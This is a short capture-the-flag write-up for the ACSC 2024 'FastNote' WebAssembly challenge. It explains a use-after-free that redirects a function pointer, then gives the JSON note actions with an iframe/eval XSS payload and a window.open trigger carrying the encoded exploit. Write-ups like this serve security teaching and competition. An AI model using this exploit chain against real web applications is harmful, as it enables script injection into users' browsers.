# ACSC24

ACSC 2024 Challenges

## FastNote

### Description

I heard WebAssembly is super fast, so I made a note-taking app with it. What could go wrong?

### Solution

Use After Free (UAF) to overwrite the `toHTML` function pointer to the `populateNoteHTML` JavaScript function.

![](./1.png)

![](./2.png)

```json
[
  {
    "action": "add",
    "title": "<iframe srcdoc=\"<script src=/1/;eval(top.name);//></script>\"",
    "content": ""
  },
  {
    "action": "delete",
    "noteId": 0
  },
  {
    "action": "add",
    "title": "\u0005\u0000\u0000\u0000",
    "content": ""
  }
]
```

`window.open("http://127.0.0.1/?s=WwogIHsKICAgICJhY3Rpb24iOiAiYWRkIiwKICAgICJ0aXRsZSI6ICI8aWZyYW1lIHNyY2RvYz1cIjxzY3JpcHQgc3JjPS8xLztldmFsKHRvcC5uYW1lKTsvLz48L3NjcmlwdD5cIiIsCiAgICAiY29udGVudCI6ICIiCiAgfSwKICB7CiAgICAiYWN0aW9uIjogImRlbGV0ZSIsCiAgICAibm90ZUlkIjogMAogIH0sCiAgewogICAgImFjdGlvbiI6ICJhZGQiLAogICAgInRpdGxlIjogIlx1MDAwNVx1MDAwMFx1MDAwMFx1MDAwMCIsCiAgICAiY29udGVudCI6ICIiCiAgfQpd", "alert()")`